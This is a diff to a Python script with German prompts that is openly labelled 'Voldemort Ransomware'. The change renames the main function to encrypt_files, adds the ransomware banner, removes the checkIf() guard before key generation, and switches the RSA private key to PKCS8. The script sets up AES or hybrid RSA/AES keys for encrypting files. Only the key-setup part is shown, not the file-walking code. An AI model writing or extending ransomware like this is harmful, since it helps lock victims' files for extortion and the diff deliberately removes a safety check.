@@ -99,26 +99,27 @@ def checkIf():
     return True
     
 
-# Auswahl ob es mit AES oder RSA verschüsslet werden soll
-def main():
-    print("Wählen den Verschlüsselungsalgorithmus:")
+def encrypt_files():
+    print("\n=== Voldemort Ransomware ===")
+    print("Wähle Verschlüsselungsalgorithmus:")
     print("1. AES")
     print("2. RSA")
-    choice = input("Deine Wahl (1 oder 2): ")
+    choice = input("Wahl (1 oder 2): ")
 
-    if choice == "1" and checkIf():
+    if choice == "1":
         aes_key = generate_aes_key()
         with open("thekey.key", "wb") as key_file:
             key_file.write(aes_key)
         encrypt_func = lambda data: aes_encrypt(aes_key, data)
-        print("AES Schlüssel generiert.")
-    elif choice == "2" and checkIf():
+        print("AES Modus aktiviert")
+
+    elif choice == "2":
         aes_key = generate_aes_key()
         rsa_key = generate_rsa_key()
         with open("thekey.key", "wb") as key_file:
             key_file.write(rsa_key.private_bytes(
                 encoding=serialization.Encoding.PEM,
-                format=serialization.PrivateFormat.TraditionalOpenSSL,
+                format=serialization.PrivateFormat.PKCS8,
                 encryption_algorithm=serialization.NoEncryption()
             ))
         public_key = rsa_key.public_key()
@@ -126,7 +127,7 @@ def main():
         with open("aes_key.enc", "wb") as key_file:
             key_file.write(encrypted_aes_key)
         encrypt_func = lambda data: aes_encrypt(aes_key, data)
-        print("RSA Schlüssel generiert.")
+        print("RSA/AES Hybrid Modus aktiviert")
     else:
         print("Ungültige Wahl!")
         return
